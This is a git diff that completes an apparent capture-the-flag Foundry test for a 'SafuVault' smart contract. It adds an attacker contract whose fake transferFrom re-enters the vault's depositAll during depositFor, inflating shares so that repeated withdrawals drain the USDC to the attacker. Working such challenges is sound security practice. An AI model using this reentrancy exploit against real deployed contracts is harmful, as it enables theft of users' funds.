@@ -64,9 +64,9 @@ contract Testing is Test {
     /// solves the challenge
     function testChallengeExploit() public {
         vm.startPrank(attacker,attacker);
-
-        // implement solution here
-
+        A a = new A(safuVault, usdc);
+        usdc.transfer(address(a), 10_000 ether);
+        a.init();
         vm.stopPrank();
         validation();
     }
@@ -81,4 +81,28 @@ contract Testing is Test {
 
     }
 
+}
+
+contract A {
+    SafuVault immutable private safuVault;
+    Token immutable private usdc;
+
+    constructor(SafuVault _safuVault, Token _usdc){
+        safuVault = _safuVault;
+        usdc = _usdc;
+        usdc.approve(address(safuVault), type(uint).max);
+    }
+
+    function init() external {
+        for (uint i = 0; i < 4; i++) {
+            safuVault.depositFor(address(this), 0, address(this));
+            safuVault.withdrawAll();
+        }
+        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
+    }
+
+    function transferFrom(address, address, uint) external returns (bool) {
+        safuVault.depositAll();
+        return true;
+    }
 }
